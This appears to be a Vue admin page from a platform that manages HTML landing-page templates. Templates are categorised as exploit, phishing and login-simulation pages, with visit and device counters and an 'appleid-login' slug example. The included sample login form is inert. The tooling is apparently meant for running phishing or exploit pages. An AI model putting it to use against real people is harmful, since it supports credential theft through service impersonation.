<template>
  <div class="templates-page">
    <div class="page-card">
      <div class="page-header">
        <div>
          <div class="page-title">模板管理</div>
          <div class="page-subtitle">落地页模板 CRUD，支持一键加载常用默认模板</div>
        </div>
        <div style="display:flex;gap:8px;">
          <el-button @click="seedTemplates(false)">
            <el-icon><MagicStick /></el-icon>
            <span>加载默认模板</span>
          </el-button>
          <el-button type="primary" @click="openCreate">
            <el-icon><Plus /></el-icon>
            <span>新建模板</span>
          </el-button>
        </div>
      </div>

      <div class="search-bar">
        <el-input v-model="filters.q" placeholder="搜索 Slug / 名称 / 标题" clearable style="width:280px;" @clear="loadList" @keyup.enter="loadList">
          <template #prefix><el-icon><Search /></el-icon></template>
        </el-input>
        <el-select v-model="filters.category" placeholder="分类" clearable style="width:150px;" @change="loadList">
          <el-option label="漏洞利用" value="exploit" />
          <el-option label="钓鱼页面" value="phishing" />
          <el-option label="登录模拟" value="login" />
          <el-option label="通用页面" value="generic" />
        </el-select>
        <el-select v-model="filters.enabled" placeholder="状态" clearable style="width:140px;" @change="loadList">
          <el-option label="全部" value="" />
          <el-option label="启用" :value="true" />
          <el-option label="禁用" :value="false" />
        </el-select>
        <el-button type="primary" @click="loadList">搜索</el-button>
      </div>

      <el-table :data="list" stripe>
        <el-table-column prop="slug" label="Slug" width="170">
          <template #default="{ row }"><span class="mono">{{ row.slug }}</span></template>
        </el-table-column>
        <el-table-column prop="name" label="名称" width="190" />
        <el-table-column label="分类" width="110">
          <template #default="{ row }">
            <el-tag size="small" :type="catTag(row.category)" effect="plain">{{ catLabel(row.category) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column label="状态" width="70">
          <template #default="{ row }">
            <span class="status-dot status-dot-success" v-if="row.enabled" title="启用"></span>
            <span class="status-dot status-dot-info" v-else title="禁用"></span>
          </template>
        </el-table-column>
        <el-table-column prop="title" label="页面标题" show-overflow-tooltip />
        <el-table-column prop="visit_count" label="访问量" width="100" sortable>
          <template #default="{ row }">{{ (row.visit_count || 0).toLocaleString() }}</template>
        </el-table-column>
        <el-table-column prop="device_count" label="设备数" width="90" sortable>
          <template #default="{ row }">{{ row.device_count || 0 }}</template>
        </el-table-column>
        <el-table-column label="预览" width="90">
          <template #default="{ row }">
            <el-button type="primary" link size="small" @click="previewRow(row)">预览</el-button>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="190" fixed="right">
          <template #default="{ row }">
            <el-button type="primary" link size="small" @click="openEdit(row)">编辑</el-button>
            <el-button type="success" link size="small" @click="cloneRow(row)">克隆</el-button>
            <el-button type="danger" link size="small" @click="deleteRow(row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        v-model:current-page="page"
        v-model:page-size="pageSize"
        :page-sizes="[20, 50, 100, 200]"
        :total="total"
        layout="total, sizes, prev, pager, next"
        background
        @current-change="loadList"
        @size-change="loadList"
      />
    </div>

    <el-dialog v-model="dialogVisible" :title="form.id ? '编辑模板' : '新建模板'" width="820px" top="5vh">
      <el-form :model="form" :rules="rules" ref="formRef" label-width="100px">
        <el-row :gutter="12">
          <el-col :span="12">
            <el-form-item label="Slug" prop="slug">
              <el-input v-model="form.slug" placeholder="英文标识（如 appleid-login）" :disabled="!!form.id" />
            </el-form-item>
          </el-col>
          <el-col :span="12">
            <el-form-item label="名称" prop="name">
              <el-input v-model="form.name" placeholder="模板名称" />
            </el-form-item>
          </el-col>
        </el-row>
        <el-row :gutter="12">
          <el-col :span="8">
            <el-form-item label="分类" prop="category">
              <el-select v-model="form.category" style="width:100%;">
                <el-option label="漏洞利用" value="exploit" />
                <el-option label="钓鱼页面" value="phishing" />
                <el-option label="登录模拟" value="login" />
                <el-option label="通用页面" value="generic" />
              </el-select>
            </el-form-item>
          </el-col>
          <el-col :span="10">
            <el-form-item label="页面标题" prop="title">
              <el-input v-model="form.title" placeholder="浏览器标题" />
            </el-form-item>
          </el-col>
          <el-col :span="6">
            <el-form-item label="状态" prop="enabled">
              <el-switch v-model="form.enabled" active-text="启用" inactive-text="禁用" />
            </el-form-item>
          </el-col>
        </el-row>
        <el-form-item label="预览链接">
          <el-input v-model="form.preview_url" placeholder="可选，外部预览 URL" />
        </el-form-item>
        <el-form-item label="描述" prop="description">
          <el-input v-model="form.description" type="textarea" :rows="2" placeholder="模板用途说明" />
        </el-form-item>
        <el-form-item label="HTML 内容" prop="html_index">
          <el-input
            v-model="form.html_index"
            type="textarea"
            :rows="16"
            class="mono"
            placeholder='输入完整的 HTML 模板内容，支持占位符如 {{channel}}、{{redirect_url}}、{{api_key}}'
          />
        </el-form-item>
        <el-form-item label="2FA 验证码" v-if="requireOtp" prop="tpl_otp">
          <el-input v-model="form.tpl_otp" placeholder="输入 Google Authenticator 6 位数字" maxlength="6" style="width:240px;" />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="submitting" @click="submitForm">保存</el-button>
      </template>
    </el-dialog>

    <el-drawer
      v-model="previewDrawer"
      :title="'预览模板：' + (previewName || '')"
      direction="rtl"
      size="60%"
      destroy-on-close
    >
      <div style="height:100%;display:flex;flex-direction:column;gap:10px;">
        <div style="display:flex;gap:8px;align-items:center;">
          <el-link
            type="primary"
            :href="previewUrl"
            target="_blank"
            underline="never"
            v-if="previewUrl"
          >
            <el-icon><Link /></el-icon>
            <span style="margin-left:4px;">新窗口打开</span>
          </el-link>
          <el-tag size="small" type="info" effect="plain" v-if="previewName">{{ previewName }}</el-tag>
          <el-tag size="small" type="success" effect="plain" v-if="previewUrl">真实渲染模式</el-tag>
        </div>
        <iframe
          :src="previewUrl"
          style="flex:1;width:100%;border:1px solid #ebeef5;border-radius:6px;background:#fff;"
          :title="previewName || 'template-preview'"
        />
      </div>
    </el-drawer>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Plus, Search, MagicStick, Link } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { require2FA } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(50)
const filters = reactive({ q: '', category: '', enabled: '' })

const dialogVisible = ref(false)
const previewDrawer = ref(false)
const previewUrl = ref('')
const previewName = ref('')
const submitting = ref(false)
const formRef = ref(null)
const requireOtp = ref(true)
const form = reactive(defaultForm())
const rules = {
  slug: [{ required: true, message: '请输入 Slug', trigger: 'blur' }],
  name: [{ required: true, message: '请输入名称', trigger: 'blur' }],
  category: [{ required: true, message: '请选择分类', trigger: 'change' }],
  html_index: [{ required: true, message: '请输入 HTML 内容', trigger: 'blur' }]
}

function defaultForm() {
  return { id: null, slug: '', name: '', category: 'phishing', title: '', description: '', html_index: '', preview_url: '', enabled: true, tpl_otp: '' }
}

function catLabel(c) {
  return { exploit: '漏洞利用', phishing: '钓鱼页面', login: '登录模拟', generic: '通用页面' }[c] || (c || '通用')
}

function catTag(c) {
  return { exploit: 'danger', phishing: 'warning', login: 'primary', generic: 'info' }[c] || 'info'
}

function openCreate() {
  Object.assign(form, defaultForm())
  form.html_index = sampleHTML()
  dialogVisible.value = true
}

function openEdit(row) {
  Object.assign(form, {
    ...defaultForm(),
    ...row,
    enabled: row.enabled !== 0 && row.enabled !== false,
    html_index: row.html_index || row.html_content || sampleHTML(),
    tpl_otp: ''
  })
  dialogVisible.value = true
}

function cloneRow(row) {
  Object.assign(form, {
    ...defaultForm(),
    ...row,
    id: null,
    slug: (row.slug || 'tpl') + '_copy_' + Date.now().toString(36),
    name: (row.name || '模板') + ' 副本',
    html_index: row.html_index || row.html_content || sampleHTML(),
    tpl_otp: ''
  })
  dialogVisible.value = true
}

function previewRow(row) {
  previewName.value = row.name || row.slug || '模板预览'
  if (row.id) {
    const base = window.location.origin.replace(/\/$/, '')
    previewUrl.value = `${base}/api/templates/${row.id}/preview`
  } else {
    previewUrl.value = ''
    try {
      const html = row.html_index || row.html_content || sampleHTML()
      const blob = new Blob([html], { type: 'text/html;charset=utf-8' })
      previewUrl.value = URL.createObjectURL(blob)
    } catch (_) {}
  }
  previewDrawer.value = true
}

function sampleHTML() {
  return `<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>{{title}}</title>
<style>
* { box-sizing: border-box; }
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
  background: linear-gradient(135deg,#667eea 0%,#764ba2 100%);
  min-height: 100vh;
  display: flex; align-items: center; justify-content: center;
  padding: 20px;
}
.card {
  background: #fff;
  border-radius: 14px;
  padding: 34px 28px;
  width: 100%;
  max-width: 380px;
  box-shadow: 0 18px 50px rgba(0,0,0,0.18);
}
.card h2 { margin: 0 0 8px; text-align: center; font-size: 22px; }
.card p.sub { margin: 0 0 22px; text-align: center; color: #909399; font-size: 14px; }
.field { margin-bottom: 14px; }
.field label { display: block; margin-bottom: 6px; font-size: 13px; color: #606266; }
.field input {
  width: 100%;
  height: 42px;
  border: 1px solid #dcdfe6;
  border-radius: 8px;
  padding: 0 12px;
  font-size: 15px;
  outline: none;
  transition: border-color .15s;
}
.field input:focus { border-color: #409eff; }
.btn {
  width: 100%;
  height: 44px;
  border: 0;
  border-radius: 8px;
  background: #409eff;
  color: #fff;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 8px;
}
.btn:active { opacity: .85; }
</style>
</head>
<body>
  <div class="card">
    <h2>{{title || '欢迎登录'}}</h2>
    <p class="sub">请输入账号信息以继续</p>
    <form onsubmit="event.preventDefault();alert('已提交（演示）');">
      <div class="field">
        <label>账号</label>
        <input type="text" placeholder="请输入账号" autocomplete="username" />
      </div>
      <div class="field">
        <label>密码</label>
        <input type="password" placeholder="请输入密码" autocomplete="current-password" />
      </div>
      <button class="btn" type="submit">继续</button>
    </form>
  </div>
</body>
</html>`
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      search: filters.q || undefined,
      category: filters.category || undefined,
      enabled: filters.enabled === '' ? undefined : filters.enabled,
    }
    const res = await axios.get('/api/templates', { params })
    list.value = res.data?.items || []
    total.value = res.data?.total || 0
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '模板加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

async function submitForm() {
  if (!formRef.value) return
  const valid = await formRef.value.validate().catch(() => false)
  if (!valid) return
  submitting.value = true
  try {
    const otp = await require2FA(form.id ? 'update template' : 'create template')
    if (otp === false) { submitting.value = false; return }
    const payload = {
      slug: form.slug, name: form.name, category: form.category,
      title: form.title || null, description: form.description || null,
      html_index: form.html_index || null,
      preview_url: form.preview_url || null,
      enabled: form.enabled,
    }
    const params = {}
    if (otp) params.otp_code = otp

    if (form.id) {
      await axios.patch(`/api/templates/${form.id}`, payload, { params })
      ElMessage.success('模板已更新')
    } else {
      await axios.post('/api/templates', payload, { params })
      ElMessage.success('模板创建成功')
    }
    dialogVisible.value = false
    loadList()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '保存失败'
    ElMessage.error(msg)
  } finally {
    submitting.value = false
  }
}

async function deleteRow(row) {
  try {
    await ElMessageBox.confirm(`确认删除模板「${row.name}」？已使用此模板的渠道需重新指定。`, '删除模板', { type: 'warning' })
    const otp = await require2FA('delete template')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.delete(`/api/templates/${row.id}`, { params })
    ElMessage.success('已删除')
    loadList()
  } catch (err) {
    if (err !== 'cancel' && err !== 'close') {
      const msg = err?.response?.data?.detail || err?.message || '删除失败'
      ElMessage.error(msg)
    }
  }
}

async function seedTemplates(force = false) {
  try {
    const res = await axios.post('/api/templates/seed', null, { params: { force } })
    ElMessage.success(res.data?.message || '已加载默认模板')
    loadList()
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '加载默认模板失败'
    ElMessage.error(msg)
    loadList()
  }
}

onMounted(loadList)
</script>

<style scoped>
.templates-page { width: 100%; }
.status-dot {
  display: inline-block;
  width: 10px;
  height: 10px;
  border-radius: 50%;
  vertical-align: middle;
}
.status-dot-success {
  background: #67c23a;
  box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.18);
}
.status-dot-info {
  background: #909399;
  box-shadow: 0 0 0 2px rgba(144, 147, 153, 0.18);
}
.mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
</style>
